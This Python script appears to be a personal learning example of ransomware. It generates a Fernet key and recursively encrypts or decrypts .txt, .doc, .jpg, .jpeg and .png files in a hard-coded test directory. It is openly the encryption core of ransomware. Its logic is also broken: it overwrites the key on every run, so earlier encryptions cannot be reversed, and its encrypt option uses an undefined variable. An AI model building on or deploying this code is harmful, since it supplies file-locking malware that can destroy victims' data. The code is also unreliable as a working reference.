#!/usr/bin/env python

import os
import time

from cryptography.fernet import Fernet
import sys, getopt
import base64
from encrypt import encrypt_files_in_dir_recursively
from decrypt import decrypt_files_in_dir_recursively

target_directory = (
    "/Users/jamieskinner/Desktop/Personal/python-examples/ransomware/testing"
)
root_directory = "/Users/jamieskinner/Desktop/Personal/python-examples/ransomware/keys"
extensions_to_encrypt = [".txt", ".doc", ".jpg", ".jpeg", ".png"]

# grabs the encryption key
key_path = os.path.join(root_directory, "private.key")


def generate_and_save_fernet_key(filename):
    with open(filename, "wb") as file:
        key = Fernet.generate_key()
        file.write(key)
        file.close()


generate_and_save_fernet_key(key_path)


def import_fernet_key(filename):
    with open(filename, "rb") as file:
        private_key = open(key_path, "rb")

    return private_key


def main(argv):
    try:
        opts, args = getopt.getopt(
            argv,
            "hdDeE",
        )
    except:
        print("Error")

    for opt, arg in opts:
        if opt in ["-d", "-D"]:
            print("Decrypting...")
            fernet_key = import_fernet_key(key_path).read()
            print(fernet_key)
            fernet = Fernet(fernet_key)
            decrypt_files_in_dir_recursively(fernet, target_directory)
        elif opt in ["-h"]:
            print(
                "Usage \n\t -d, -D\t:Decrypt \n\t -e, -E\t:Encrypt \n\t -g, -G\t:Generate key"
            )
        elif opt in ["-g", "-G"]:
            print("Generating key...")
            generate_and_save_fernet_key(key_path)
        elif opt in ["-e", "-E"]:
            print("Encrypting...")
            # encrypt the files
            encrypt_files_in_dir_recursively(
                fernet, target_directory, extensions_to_encrypt
            )


# RUN MAIN FUNCTION
if __name__ == "__main__":
    main(sys.argv[1:])
